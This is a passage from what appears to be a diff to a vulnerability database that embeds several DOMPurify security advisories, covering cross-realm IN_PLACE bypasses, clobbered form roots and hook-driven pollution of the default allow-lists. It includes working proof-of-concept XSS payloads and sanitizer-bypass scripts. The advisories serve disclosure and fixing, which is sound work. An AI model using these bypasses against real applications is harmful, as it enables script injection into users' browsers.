= 0;\n  const clone = idoc.importNode(tpl.content, true);\n  document.body.appendChild(clone);                        // fires onerror\n};\ndocument.body.appendChild(iframe);\n```\n\nObserved:\n\n```json\n{\n  \"before\": {\n    \"templateIsMainRealmHTMLTemplateElement\": false,\n    \"contentIsMainRealmDocumentFragment\": false,\n    \"contentIsForeignRealmDocumentFragment\": true\n  },\n  \"after\": {\n    \"templateInnerHTMLAfter\": \"<img src=\\\"x\\\" onerror=\\\"window.parent.__dompurify_template_xss=(window.parent.__dompurify_template_xss||0)+1\\\">\",\n    \"xssExecuted\": 1\n  }\n}\n```\n\n### PoC 3 \u2014 cross-realm attached shadow root is never walked\n\n```js\nconst iframe = document.createElement('iframe');\niframe.srcdoc = '<!doctype html><html><body></body></html>';\niframe.onload = () => {\n  const idoc = iframe.contentDocument;\n  const host = idoc.createElement('div');\n  host.attachShadow({ mode: 'open' }).innerHTML =\n    '<img src=x onerror=\"window.parent.__dompurify_shadow_xss=(window.parent.__dompurify_shadow_xss||0)+1\"><b>safe text</b>';\n\n  DOMPurify.sanitize(host, { IN_PLACE: true });\n\n  window.__dompurify_shadow_xss = 0;\n  document.body.appendChild(host);                          // shadow activates, onerror fires\n};\ndocument.body.appendChild(iframe);\n```\n\nObserved:\n\n```json\n{\n  \"before\": {\n    \"hostIsMainRealmElement\": false,\n    \"shadowRootIsMainRealmDocumentFragment\": false,\n    \"shadowRootIsForeignRealmDocumentFragment\": true\n  },\n  \"after\": {\n    \"shadowRootInnerHTMLAfter\": \"<img src=\\\"x\\\" onerror=\\\"window.parent.__dompurify_shadow_xss=(window.parent.__dompurify_shadow_xss||0)+1\\\"><b>safe text</b>\",\n    \"xssExecuted\": 1\n  }\n}\n```\n\nAll three PoCs run cleanly against `dist/purify.js` built from current `main` HEAD `89da34e`.\n\n## Impact\n\n### Direct\n\nAny application that parses, isolates, or constructs untrusted DOM inside a same-origin iframe (a common technique for `<base href>` isolation, `document.write` sandboxing, layout pre-measurement, declarative-shadow-root attachment, etc.) and then hands the resulting node to a parent-realm DOMPurify instance with `IN_PLACE: true` is vulnerable. The library returns a node whose top-level shape looks sanitized, but executable attacker markup remains in:\n\n- **Form root attributes** \u2014 `onmouseover`, `onfocus`, `onclick`, `action=\"javascript:...\"`, `formaction=`, `target=`, `id=` (DOM-clobbering target), and the full attribute-allowlist set, because `_sanitizeAttributes` walks a clobbered `.attributes` instead of the real `NamedNodeMap`.\n- **`<template>` content** \u2014 `<img onerror>`, `<svg><script>`, `<iframe srcdoc>`, etc., because the inert template tree is never recursed into.\n- **Attached shadow roots** \u2014 any markup inside the shadow root, because the shadow walk is skipped entirely.\n\nXSS triggers when the consuming code:\n- Inserts the form into the live DOM and the user interacts with it (mouseover, click, focus).\n- Clones template content with `importNode` / `cloneNode(true)` / `node.appendChild(template.content)` into the live DOM.\n- Appends the shadow host to the live document (the shadow root becomes active and `<img onerror>` fires synchronously during the insertion microtask).\n\n### Indirect / second-order\n\n- **DOM-based template engines** (Lit, Polymer, Vue, FAST) that often use foreign-realm `<template>` parsing for performance reasons. If they pipe attacker-influenced content through such a template and then run DOMPurify on the parent-realm host, the template body is sanitization-skipped.\n- **Editor / WYSIWYG frameworks** that render preview content inside a same-origin iframe and then move it into the main document after sanitization.\n- **Email/HTML preview libraries** that parse received HTML in an isolated iframe to neutralize CSS / `<base>` / form submission, then sanitize via the main page's DOMPurify.\n- **Declarative shadow DOM consumers** that adopt a host from one realm into another \u2014 the shadow subtree carries the bypass.\n\nThe known prior IN_PLACE-cross-window fix (which closed an earlier cross-window primitive) does not cover the realm-bound `instanceof` checks at `[A]`, `[B]`, `[C]`; current `main` HEAD is still affected.\n\n## Root cause\n\nPer-realm constructors. `instanceof X` checks the prototype chain against the parent realm's `X.prototype`. Foreign-realm objects have a different `X.prototype` and so fail every such check. The sanitizer accepts foreign-realm DOM nodes for `IN_PLACE` sanitization (the entry-point only checks node shape), but several internal security decisions are still bound to the parent realm. This produces an inconsistency: *\"we accept your node, but we silently behave as if it is not a form, not a template, not a shadow root.\"*\n\nOther realm-bound `instanceof` sites in the same file that should likely be audited as part of the same fix sweep:\n\n```ts\nelement instanceof HTMLFormElement     // src/purify.ts:1122\nelement.attributes instanceof NamedNodeMap  // src/purify.ts:1126\nsr instanceof DocumentFragment         // src/purify.ts:1706\ncurrentNode.content instanceof DocumentFragment  // src/purify.ts:1861\nshadowNode.content instanceof DocumentFragment   // src/purify.ts:1660 (approx)\ncurrentNode instanceof Element         // src/purify.ts:1296 (callsite of _checkValidNamespace)\n```\n\n## Suggested fix\n\nUse realm-independent shape checks consistently for any decision made on a node accepted from `IN_PLACE`:\n\n1. **`HTMLFormElement` detection** \u2014 compare via the realm-independent `getNodeName` cached prototype getter introduced for the recent shadow-root traversal hardening:\n\n   ```ts\n   const _isClobbered = function (element: Element): boolean {\n     const nn = getNodeName ? getNodeName(element) : element.nodeName;\n     if (typeof nn !== 'string' || transformCaseFunc(nn) !== 'form') return false;\n     // ... rest of the typeof / cached-getter shape checks ...\n   };\n   ```\n\n2. **`DocumentFragment` detection** \u2014 `nodeType === NODE_TYPE.documentFragment` (i.e., `11`), not `instanceof DocumentFragment`. The check is already realm-independent because `Node.nodeType` is a numeric constant. Same change for the `<template>`-content and attached-shadow-root recursion sites.\n\n3. **`NamedNodeMap` detection** \u2014 read `element.attributes` via the cached `Element.prototype.attributes` getter (introduce `getAttributes = lookupGetter(ElementPrototype, 'attributes')`) and verify `nodeType === 11`-style shape (length is a number, indexed `[i]` returns objects with `.name`/`.value` strings). Do not rely on `instanceof NamedNodeMap`.\n\n4. **`Element` detection** at `:1296` \u2014 replace `currentNode instanceof Element` with a shape check (`getNodeType(currentNode) === NODE_TYPE.element`).\n\nThe invariant the fix should encode: *once `IN_PLACE` accepts a foreign-realm node for sanitization, every downstream security decision on that node must be foreign-realm-safe.* The cached prototype getters introduced for the shadow-root hardening already point at the right pattern; the fix is to extend that pattern to every realm-bound check in the sanitization path.",
+                info: [
+                  "https://github.com/cure53/DOMPurify/security/advisories/GHSA-hpcv-96wg-7vj8"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "3.4.6",
+                severity: "medium",
+                cwe: [
+                  "CWE-79",
+                  "CWE-693",
+                  "CWE-1321"
+                ],
+                identifiers: {
+                  summary: "DOMPurify: IN_PLACE mode preserves attributes of a clobbered root element, allowing XSS via attacker-controlled root DOM",
+                  githubID: "GHSA-r47g-fvhr-h676",
+                  CVE: [
+                    "CVE-2026-49459"
+                  ]
+                },
+                details: "# IN_PLACE mode preserves attributes of a clobbered root element, allowing XSS via attacker-controlled root DOM\n\n**CWE**: CWE-79 (XSS \u2014 Improper Neutralization of Input During Web Page Generation) via CWE-693 (Protection Mechanism Failure \u2014 silent no-op when `_forceRemove` is called on a parent-less node)\n\n## Summary\n\nWhen `DOMPurify.sanitize(root, { IN_PLACE: true })` is called and `root` is a `<form>` whose own attributes carry an event handler (`onmouseover`, `onfocus`, `onclick`, etc.), a single descendant element with a `name=` attribute matching any of the property names `_isClobbered` checks (`nodeName`, `setAttribute`, `namespaceURI`, `insertBefore`, `hasChildNodes`, `childNodes`) is sufficient to bypass attribute sanitization on the root. `_forceRemove` silently no-ops because the root has no parent; the iterator drives on to `_sanitizeAttributes`, which early-returns on clobbered nodes \u2014 and the event handler attribute is never inspected. The sanitized return is the same root, with the handler live.\n\nThis affects current `main` at `89da34e` (the just-landed DOM-clobbering hardening fix at `89da34e` addressed `_sanitizeAttachedShadowRoots` walk traversal, **not** the main `_sanitizeElements` / `_sanitizeAttributes` pipeline against the iterator-root node).\n\n## Affected\n\n- DOMPurify \u2264 3.4.5, including `main` at `89da34e03ec17868e561f87f3747a9371b61a9e7`\n- Any caller that does `DOMPurify.sanitize(node, { IN_PLACE: true })` where `node` is built from untrusted HTML (e.g., parsed via `createElement('template').innerHTML = dirty` then `template.content.firstElementChild` handed in)\n\nNot affected:\n- String-input `DOMPurify.sanitize(dirtyString)` \u2014 the library builds the DOM itself inside `_initDocument`, the root is the cleanly-created document body, and clobber-named children of the body cannot shadow `body` named properties (HTMLBodyElement does not carry `[LegacyOverrideBuiltIns]`)\n- IN_PLACE where the root is not an HTMLFormElement\n- IN_PLACE where the attacker cannot place a clobber-named child inside the root\n\n## Vulnerability details\n\n### Code paths\n\n**[A]** \u2014 `_forceRemove` at `src/purify.ts:930-939`:\n\n```ts\nconst _forceRemove = function (node: Node): void {\n  arrayPush(DOMPurify.removed, { element: node });\n  try {\n    // eslint-disable-next-line unicorn/prefer-dom-node-remove\n    getParentNode(node).removeChild(node);   // [A1] throws when getParentNode returns null\n  } catch (_) {\n    remove(node);                             // [A2] WebIDL Node.remove() \u2014 spec-defined no-op\n  }                                           //      when the node has no parent\n};\n```\n\nWhen the iterator-root has no parent (the standard IN_PLACE case where the caller hands in a detached node), `getParentNode(node)` returns `null`, `null.removeChild(node)` throws, the catch falls to `remove(node)` \u2014 which per WebIDL is `Element.prototype.remove.call(node)`, and per spec **does nothing if the node has no parent**. Nothing about `_forceRemove`'s contract acknowledges this \u2014 the function appears to its callers as \"the node is gone now,\" but the node is still in place.\n\n**[B]** \u2014 `_sanitizeAttributes` at `src/purify.ts:1490-1492`:\n\n```ts\nconst _sanitizeAttributes = function (currentNode: Element): void {\n  _executeHooks(hooks.beforeSanitizeAttributes, currentNode, null);\n\n  const { attributes } = currentNode;\n\n  /* Check if we have attributes; if not we might have a text node */\n  if (!attributes || _isClobbered(currentNode)) {\n    return;                                   // [B] silently skips ALL attribute checks\n  }                                           //     for clobbered nodes\n  ...\n};\n```\n\nThe skip at `[B]` is deliberate \u2014 the intent is to avoid touching nodes the library has already decided to discard. The invariant the comment implies is *\"if `_isClobbered`, then `_sanitizeElements` already removed this node, so we will never reach `_sanitizeAttributes` on it.\"* That invariant holds for every non-root node (their `_forceRemove` succeeds in detaching them), but fails for the iterator root in IN_PLACE mode.\n\n**The mismatch** is between [A] and [B]: [A] assumes \"removal\" means the node will not be observed again, and [B] assumes any clobbered node it sees has already been removed. Neither holds for the iterator root. A correct guard would either make `_forceRemove` fail loudly on parent-less nodes (so the caller can bail out of IN_PLACE entirely) or have `_sanitizeAttributes` strip attributes from clobbered roots before returning.\n\n### Iterator call site\n\n`src/purify.ts:1850-1864` ignores the boolean return value of `_sanitizeElements`:\n\n```ts\nconst nodeIterator = _createNodeIterator(IN_PLACE ? dirty : body);\n\nwhile ((currentNode = nodeIterator.nextNode())) {\n  _sanitizeElements(currentNode);       // returns `true` if killed \u2014 IGNORED\n  _sanitizeAttributes(currentNode);     // runs unconditionally; relies on [B]'s skip\n  ...\n}\n```\n\nIf the return value were checked and `_sanitizeAttributes` skipped when the node was \"killed,\" the bug would not exist as a discrete issue \u2014 but currently `_sanitizeAttributes` is the only line of defense for a node that `_sanitizeElements` could not actually detach.\n\n### Why the clobber works\n\nIn Chromium/WebKit/Firefox, `HTMLFormElement` carries the WebIDL `[LegacyOverrideBuiltIns]` extended attribute on its named-property getter. A descendant element with `name=\"X\"` (or `id=\"X\"`, for radio-button-like names) shadows the matching property on the form, including properties inherited from `Element`, `Node`, and `EventTarget` prototypes. This is the same primitive the just-landed `89da34e` fix addresses for shadow-root traversal, but `_isClobbered`'s typeof checks (and the bypass-by-detection-failure path here) are independent of that fix.\n\nVerified clobber targets (each name= value independently triggers `_isClobbered`):\n\n| `name=` value | property `_isClobbered` checks | typeof on clobbered form |\n|---|---|---|\n| `nodeName` | `typeof element.nodeName !== 'string'` | object (an `<INPUT>`) |\n| `setAttribute` | `typeof element.setAttribute !== 'function'` | object (not callable) \u2014 *but* `<embed>`/`<applet>`/`<iframe>` ARE callable; see \"Note on callable elements\" below |\n| `namespaceURI` | `typeof element.namespaceURI !== 'string'` | object |\n| `insertBefore` | `typeof element.insertBefore !== 'function'` | object |\n| `hasChildNodes` | `typeof element.hasChildNodes !== 'function'` | object |\n| `childNodes` | `!(element.childNodes && typeof element.childNodes.length === 'number')` | object \u2014 `<INPUT>` has no `.length` |\n| `attributes` | `!(element.attributes instanceof NamedNodeMap)` | object (an `<INPUT>` is not a NamedNodeMap) |\n| `textContent` | `typeof element.textContent !== 'string'` | object |\n| `removeChild` | `typeof element.removeChild !== 'function'` | object (non-callable) |\n| `removeAttribute` | `typeof element.removeAttribute !== 'function'` | object (non-callable) |\n\nAny single one of the ten property names in `_isClobbered`'s checklist is sufficient as the bypass trigger.\n\n## Proof of concept\n\n### (1) Minimal \u2014 runnable in a single browser context\n\n```html\n<!doctype html>\n<html><body>\n<script src=\"dist/purify.js\"><\/script>\n<script>\n  const root = document.createElement('form');\n  root.setAttribute('onmouseover', 'window.__rooted = 1');\n  const clobber = document.createElement('input');\n  clobber.setAttribute('name', 'nodeName');\n  root.appendChild(clobber);\n\n  // typeof root.nodeName === 'object' (an <INPUT> element), not 'string'.\n  // _isClobbered fires; _forceRemove(root) becomes a no-op because root.parentNode === null.\n  DOMPurify.sanitize(root, { IN_PLACE: true });\n\n  console.log('output:', root.outerHTML);\n  // <form onmouseover=\"window.__rooted = 1\"><input name=\"nodeName\"></form>\n  //  ^^^^^^^^^^^^^^^^^^ event handler survived ^^^^^^^^^^^^^^^^^^\n\n  document.body.appendChild(root);\n  root.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));\n  console.log('handler fired:', window.__rooted === 1);  // true\n<\/script>\n</body></html>\n```\n\n### (2) End-to-end \u2014 Playwright against `main` HEAD\n\n```js\nconst { chromium } = require('playwright');\nconst path = require('path');\n\n(async () => {\n  const browser = await chromium.launch();\n  const page = await browser.newPage();\n  await page.setContent('<!doctype html><html><body></body></html>');\n  await page.addScriptTag({ path: path.resolve('dist/purify.js') });\n\n  const result = await page.evaluate(() => {\n    const root = document.createElement('form');\n    root.setAttribute('onmouseover', 'window.__rooted = 1');\n    const clobber = document.createElement('input');\n    clobber.setAttribute('name', 'nodeName');\n    root.appendChild(clobber);\n\n    DOMPurify.sanitize(root, { IN_PLACE: true });\n\n    document.body.appendChild(root);\n    window.__rooted = 0;\n    root.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));\n\n    return {\n      version: DOMPurify.version,\n      output: root.outerHTML,\n      handlerFired: window.__rooted === 1,\n    };\n  });\n  console.log(result);\n  await browser.close();\n})();\n```\n\nObserved (Chromium 148.0.7778.96, DOMPurify 3.4.5, HEAD `89da34e`):\n\n```\n{\n  version: '3.4.5',\n  output: '<form onmouseover=\"window.__rooted = 1\"><input name=\"nodeName\"></form>',\n  handlerFired: true\n}\n```\n\n### (3) Variant matrix \u2014 six distinct clobber-target properties\n\nEvery property name in `_isClobbered`'s typeof checklist works as the bypass trigger:\n\n```\n[BYPASS] name=\"nodeName\"      \u2192 <form onmouseover=\"\u2026\"><input></form>\n[BYPASS] name=\"setAttribute\"  \u2192 <form onmouseover=\"\u2026\"><input></form>\n[BYPASS] name=\"namespaceURI\"  \u2192 <form onmouseover=\"\u2026\"><input></form>\n[BYPASS] name=\"insertBefore\"  \u2192 <form onmouseover=\"\u2026\"><input></form>\n[BYPASS] name=\"hasChildNodes\" \u2192 <form onmouseover=\"\u2026\"><input></form>\n[BYPASS] name=\"childNodes\"    \u2192 <form onmouseover=\"\u2026\"><input></form>\n```\n\nThis makes the fix less of a one-line patch \u2014 every property `_isClobbered` checks for the typeof-spoofing pattern needs to be considered.\n\n## Impact\n\n### Direct\n\nTwo distinct impact paths from the same root-attribute-survival primitive:\n\n**(a) XSS via event-handler attribute on the surviving root.** Any consumer that uses `DOMPurify.sanitize(node, { IN_PLACE: true })` where `node` originated from untrusted HTML and is re-inserted into the live document is vulnerable to XSS. The typical pattern is:\n\n```js\nconst t = document.createElement('template');\nt.innerHTML = untrustedHtml;\nDOMPurify.sanitize(t.content.firstElementChild, { IN_PLACE: true });\ncontainer.appendChild(t.content.firstElementChild);\n```\n\nIf `untrustedHtml` is `<form onmouseover=\u2026><input name=nodeName>\u2026</form>`, the resulting node has the `onmouseover` attribute intact when re-inserted into the live document.\n\n**(b) Every attribute-level defense is bypassed on the surviving root, not just event handlers.** The `_sanitizeAttributes` early-return at `:1490` skips the entire attribute walk for clobbered nodes, so the root preserves attributes that the attribute walk would otherwise sanitize. Verified additional attributes that survive:\n\n- **`action=\"javascript:...\"` and `formaction=\"javascript:...\"`** \u2014 URI validation at `:1413` never runs. A user click on a submit button inside the sanitized form navigates to the `javascript:` URL, executing the handler. Adds a click-triggered XSS path on top of the mouseover/focus event-handler attributes already documented.\n- **`id=\"<colliding-name>\"`** \u2014 the DOM-clobbering guard at `:1352-1359` (`SANITIZE_DOM && (lcName === 'id' || lcName === 'name') && (value in document || value in formElement)`) lives inside `_sanitizeAttributes` and is skipped. An attacker can therefore land `id=\"cookie\"`, `id=\"body\"`, `id=\"head\"`, `id=\"firstChild\"`, etc. on the surviving form root and use it as a DOM-clobbering primitive against any consumer code that does `document.cookie`, `document.body`, etc.\n- **`target=\"_top\"`**, **`autofocus`**, **`formenctype`**, **`formmethod`** \u2014 all survive untouched.\n- **Custom event handlers DOMPurify wouldn't have explicit list entries for** (e.g., newly-spec'd `oncontentvisibilityautostatechange`) survive on the clobbered root via the same skip; the per-name allow-list at `:1361-1364` never runs.\n\nVerified \u2014 full attribute set survives on a single payload (PoC):\n\n```js\nconst root = document.createElement('form');\nroot.setAttribute('action', 'javascript:alert(1)');\nroot.setAttribute('target', '_top');\nroot.setAttribute('onclick', 'alert(2)');\nroot.setAttribute('onmouseover', 'alert(3)');\nroot.setAttribute('autofocus', '');\nroot.setAttribute('formaction', 'javascript:alert(4)');\nroot.setAttribute('id', 'cookie');           // DOM-clobbering primitive\nroot.innerHTML += '<input name=\"nodeName\">';\nDOMPurify.sanitize(root, { IN_PLACE: true });\nconsole.log(root.outerHTML);\n// <form action=\"javascript:alert(1)\" target=\"_top\" onclick=\"alert(2)\"\n//       onmouseover=\"alert(3)\" autofocus=\"\" formaction=\"javascript:alert(4)\"\n//       id=\"cookie\"><input></form>\n```\n\n**(c) Defense-in-depth re-sanitization on the same node is INEFFECTIVE \u2014 the clobber is sticky.** Chromium's `HTMLFormElement` named-property cache appears to retain the named child reference even after the child's `name` attribute is removed during the sanitization pass. Empirically verified \u2014 after the first sanitize pass, the input's `name=\"nodeName\"` attribute is correctly stripped (the output shows `<input>` with no attributes), yet `typeof form.nodeName === 'object'` is still true and the input element is still returned. Calling `DOMPurify.sanitize(sameNode, { IN_PLACE: true })` a second time hits the same `_isClobbered` \u2192 `_forceRemove` \u2192 `_sanitizeAttributes` early-return path. The only effective recovery is serialize-then-reparse:\n\n```js\nconst root = parseAttackerHtml();                                     // form with input name=\"nodeName\" child\nDOMPurify.sanitize(root, { IN_PLACE: true });                         // bypass: attrs survive\nDOMPurify.sanitize(root, { IN_PLACE: true });                         // STILL bypassed: attrs survive\nconst recovered = (() => {\n  const t = document.createElement('template');\n  t.innerHTML = root.outerHTML;                                       // forces a fresh parse\n  const r = t.content.firstElementChild;\n  DOMPurify.sanitize(r, { IN_PLACE: true });\n  return r;\n})();\n// recovered.outerHTML === '<form><input></form>'  \u2190 finally clean\n```\n\nA \"belt-and-suspenders\" caller that re-runs DOMPurify on its own output is therefore not protected against this primitive on Chromium; the obvious mitigation pattern fails silently. Any user-side workaround needs to route through a string round-trip.\n\n**(d) SAFE_FOR_TEMPLATES bypass for the root's attributes.** When the caller sets `SAFE_FOR_TEMPLATES: true` to defend a downstream template engine (Vue, Angular, Liquid, Handlebars, \u2026) from receiving `{{\u2026}}` / `<%\u2026%>` / `${\u2026}` syntax through DOMPurify's output, attribute-level template-syntax stripping runs in the same `_sanitizeAttributes` pass that early-returns on clobbered roots (`:1572-1576`). The root's attributes therefore retain raw template syntax that the downstream engine then evaluates.\n\nVerified \u2014 same PoC structure, with `SAFE_FOR_TEMPLATES: true`:\n\n```js\nconst root = document.createElement('form');\nroot.setAttribute('title', '{{evil}}');\nroot.setAttribute('onmouseover', 'window.__x=1');\nconst c = document.createElement('input');\nc.setAttribute('name', 'nodeName');\nroot.appendChild(c);\n\nDOMPurify.sanitize(root, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true });\n\nconsole.log(root.outerHTML);\n// <form title=\"{{evil}}\" onmouseover=\"window.__x=1\"><input></form>\n//        ^^^^^^^^^^^^^^^^ template syntax survives\n```\n\nThis compounds with (a): a single payload exfiltrates via XSS (immediate) and via SSTI to downstream renderers (delayed).\n\n(Text-node content inside the form is still scrubbed correctly \u2014 `_scrubTemplateExpressions` at `:1868-1870` walks text/comment/CDATA/PI nodes independently and reaches them via the iterator. Only attribute values on the clobbered root escape.)\n\n### Indirect / second-order\n\n- **DOM-based template systems / editors** that wrap DOMPurify with an IN_PLACE call for parsed user content (CMSes, comment widgets, WYSIWYG editors persisting structured HTML).\n- **Email/HTML preview libraries** that pre-parse received HTML before sanitization for performance reasons.\n- **Frameworks that hand DOMPurify a node tree** rather than a string \u2014 including, indirectly, any code path that does `el.innerHTML = \u2026; DOMPurify.sanitize(el, { IN_PLACE: true })`. The outer `el` is fine (it's not the form), but if the *first child* of `el` is taken as the sanitization root in a different code path, the bypass triggers.\n\n### Why current `main` is also vulnerable\n\nCommit `89da34e` (\"fix: fixed a possible DOM clobbering with IN_PLACE and shadow DOM\") hardens `_sanitizeAttachedShadowRoots` via three new cached prototype getters (`getShadowRoot`, `getNodeName`, `getNodeType`) and an `_isClobbered` extension that checks `element.childNodes.length`. The fix is correct for its scope \u2014 shadow-root traversal \u2014 but does not change `_forceRemove`'s parent-less-node behavior or `_sanitizeAttributes`'s clobber-skip early-return. The bypass demonstrated here is in the IN_PLACE main pipeline, not the shadow-root walk, and the verification PoC above runs against HEAD `89da34e` and still succeeds.\n\n## Suggested fix\n\nTwo minimal-risk options:\n\n1. **Make `_forceRemove` honest about failure**: return whether the node was actually detached, and have the iterator call site honor that.\n\n   ```ts\n   const _forceRemove = function (node: Node): boolean {\n     arrayPush(DOMPurify.removed, { element: node });\n     try {\n       getParentNode(node).removeChild(node);\n       return true;\n     } catch (_) {\n       try { remove(node); } catch (_) {}\n       return node.parentNode === null && /* but still attached to itself */ false;\n     }\n   };\n   ```\n   Then at `:1855`, if `_sanitizeElements` returns true AND IN_PLACE, force-strip all attributes of the root before returning the dirty tree. (This is what the user expects \u2014 sanitization either succeeds or refuses to return a \"sanitized\" handle to an unsanitized tree.)\n\n2. **Strip attributes inside `_sanitizeAttributes` for clobbered roots**: when `_isClobbered(currentNode)` is true at `:1490`, instead of early-returning, iterate `currentNode.attributes` (using the cached `getAttributes` if you add one) and remove each via `removeAttribute`. This preserves the existing semantics for non-root clobbered nodes (their attributes-of-a-removed-node will be GC'd anyway) and removes the attack surface for root.\n\n3. **Refuse IN_PLACE on parent-less clobbered roots**: at the top of the iterator, check that the root either has a parent OR is not `_isClobbered`. If both fail, throw. This is the most defensive option but breaks any existing caller that hands in a clobbered detached root expecting \"sanitized = empty/safe.\"\n\n### Note on callable elements\n\nIn Chromium and WebKit, `HTMLEmbedElement`, `HTMLAppletElement`, `HTMLIFrameElement`, and `HTMLScriptElement` have `typeof === 'function'` because they expose plugin/iframe `[[Call]]` traps at the WebIDL level. A `name=\"setAttribute\"` *child* of one of these tags spoofs the `setAttribute typeof === 'function'` check \u2014 but only matters for the *attribute re-set* path at `:1619`, not the bypass demonstrated here (which uses `nodeName` and friends). The callable-element vector is worth checking separately as a potential `SAFE_FOR_TEMPLATES`-bypass primitive; the present report does not depend on it.",
+                info: [
+                  "https://github.com/cure53/DOMPurify/security/advisories/GHSA-r47g-fvhr-h676"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "3.4.7",
+                severity: "medium",
+                cwe: [
+                  "CWE-501",
+                  "CWE-693"
+                ],
+                identifiers: {
+                  summary: "DOMPurify: Hook mutation of `data.allowedTags` / `data.allowedAttributes` permanently pollutes `DEFAULT_ALLOWED_TAGS` / `DEFAULT_ALLOWED_ATTR`",
+                  githubID: "GHSA-76mc-f452-cxcm",
+                  CVE: [
+                    "CVE-2026-65902"
+                  ]
+                },
+                details: "# Hook mutation of `data.allowedTags` / `data.allowedAttributes` permanently pollutes `DEFAULT_ALLOWED_TAGS` / `DEFAULT_ALLOWED_ATTR`\n\n**CWE**: CWE-501 (Trust Boundary Violation \u2014 hook-scoped mutation leaks to global default sets) via CWE-693 (Protection Mechanism Failure \u2014 the default allow-list is silently widened for all subsequent sanitize calls)\n\n## Summary\n\nThe `data.allowedTags` and `data.allowedAttributes` fields passed to `uponSanitizeElement` and `uponSanitizeAttribute` hooks are **direct references** to the library's live `ALLOWED_TAGS` / `ALLOWED_ATTR` sets. For sanitize calls that don't supply an explicit `cfg.ALLOWED_TAGS` / `cfg.ALLOWED_ATTR` array, those live sets are themselves direct references to the module-level `DEFAULT_ALLOWED_TAGS` / `DEFAULT_ALLOWED_ATTR` constants. A hook that mutates these fields \u2014 a natural-looking pattern for \"allow `X` for this iteration\" \u2014 permanently writes new entries into the default constants for the DOMPurify instance's lifetime. Every subsequent sanitize call that doesn't override the config inherits the widened defaults, so an attacker payload that uses the poisoned tag/attribute name survives sanitization. `removeAllHooks()`, `clearConfig()`, and even passing a fresh `cfg: {}` do not recover; only constructing a new DOMPurify instance does.\n\nThe maintainer's existing defense at `src/purify.ts:696-700` explicitly clones `DEFAULT_ALLOWED_TAGS` before mutating it via `cfg.ADD_TAGS` (array form), demonstrating awareness of this exact class. The hook path remained uncovered.\n\n## Affected\n\n- DOMPurify \u2264 3.4.5, including `main` at `7996f1dc78eb8b7922388aed75d94a9f8fad9a36`\n- Any application that installs a hook on `uponSanitizeElement` or `uponSanitizeAttribute` that writes to `data.allowedTags[...] = true` or `data.allowedAttributes[...] = true` and later sanitizes attacker-influenced content with default config (no explicit `cfg.ALLOWED_TAGS` / `cfg.ALLOWED_ATTR` array)\n\n## Vulnerability details\n\n### [A] \u2014 `data.allowedTags` is a reference to `ALLOWED_TAGS`\n\n`src/purify.ts:1206-1209`:\n\n```ts\n_executeHooks(hooks.uponSanitizeElement, currentNode, {\n  tagName,\n  allowedTags: ALLOWED_TAGS,         // [A] direct reference; hook mutation\n                                      //     mutates the very ALLOWED_TAGS the\n                                      //     library checks on the next element\n});\n```\n\n`src/purify.ts:1494-1500` (the matching attribute hook):\n\n```ts\nconst hookEvent = {\n  attrName: '',\n  attrValue: '',\n  keepAttr: true,\n  allowedAttributes: ALLOWED_ATTR,    // [A'] same pattern\n  forceKeepAttr: undefined,\n};\n```\n\n### [B] \u2014 `ALLOWED_TAGS = DEFAULT_ALLOWED_TAGS` for default-cfg sanitize calls\n\n`src/purify.ts:527-531`:\n\n```ts\nALLOWED_TAGS =\n  objectHasOwnProperty(cfg, 'ALLOWED_TAGS') &&\n  arrayIsArray(cfg.ALLOWED_TAGS)\n    ? addToSet({}, cfg.ALLOWED_TAGS, transformCaseFunc)\n    : DEFAULT_ALLOWED_TAGS;            // [B] reference assignment; ALLOWED_TAGS\n                                       //     IS the DEFAULT_ALLOWED_TAGS object\n```\n\n(The `ALLOWED_ATTR = DEFAULT_ALLOWED_ATTR` path at `:532-536` is symmetric.)\n\n### The mismatch\n\nA hook author who writes `data.allowedTags['script'] = true` reasonably expects per-call scope \u2014 the API name is *\"data\"*, suggesting per-event payload. But [A] makes this a direct reference, and [B] makes that reference equal to the module-level default for the common default-cfg path. The hook's mutation therefore writes to a *constant* that every subsequent default-cfg sanitize call rebinds to.\n\nThe maintainer already recognized this class for the `ADD_TAGS` array path \u2014 `src/purify.ts:696-700`:\n\n```ts\n} else if (arrayIsArray(cfg.ADD_TAGS)) {\n  if (ALLOWED_TAGS === DEFAULT_ALLOWED_TAGS) {\n    ALLOWED_TAGS = clone(ALLOWED_TAGS);   // explicitly clone DEFAULT before\n                                          // mutating to avoid this pollution\n  }\n  addToSet(ALLOWED_TAGS, cfg.ADD_TAGS, transformCaseFunc);\n}\n```\n\nThe same defensive clone is missing from the hook code paths.\n\n## Proof of concept\n\n```js\n// 1) fresh DOMPurify, default config \u2014 script is blocked\nDOMPurify.sanitize('<svg><script>alert(1)<\/script></svg>');\n// \u2192 \"<svg></svg>\"\n\n// 2) install a hook that mutates data.allowedTags (natural-looking pattern)\nDOMPurify.addHook('uponSanitizeElement', (node, data) => {\n  data.allowedTags['script'] = true;\n});\n\n// 3) one sanitize call WITH the hook \u2014 script survives (expected during the hook)\nDOMPurify.sanitize('<svg><script>alert(1)<\/script></svg>');\n// \u2192 \"<svg><script>alert(1)<\/script></svg>\"\n\n// 4) remove the hook\nDOMPurify.removeAllHooks();\nDOMPurify.clearConfig();\n\n// 5) sanitize attacker content with default config \u2014 POLLUTION PERSISTS\nDOMPurify.sanitize('<svg><script>alert(1)<\/script></svg>');\n// \u2192 \"<svg><script>alert(1)<\/script></svg>\"  \u2190 script survived without any hook\n\n// 6) the only recovery: create a fresh DOMPurify instance\nconst fresh = DOMPurify(window);\nfresh.sanitize('<svg><script>alert(1)<\/script></svg>');\n// \u2192 \"<svg></svg>\"  \u2190 clean\n```\n\nObserved (Chromium 148.0.7778.96, DOMPurify HEAD `7996f1d`):\n\n| step | input | output | bypass? |\n|---|---|---|---|\n| 1 fresh baseline | `<svg><script>__<\/script></svg>` | `<svg></svg>` | no |\n| 1b fresh baseline | `<a onclick=__>x</a>` | `<a>x</a>` | no |\n| 2 with hook (script) | `<svg><script>__<\/script></svg>` | `<svg><script>__<\/script></svg>` | yes (expected) |\n| 2b with hook (onclick) | `<a onclick=__>x</a>` | `<a onclick=\"__\">x</a>` | yes (expected) |\n| 3 after `removeAllHooks()` | same | `<svg><script>__<\/script></svg>` | **YES (pollution)** |\n| 3b after `removeAllHooks()` | same | `<a onclick=\"__\">x</a>` | **YES (pollution)** |\n| 4 after `clearConfig()` | same | 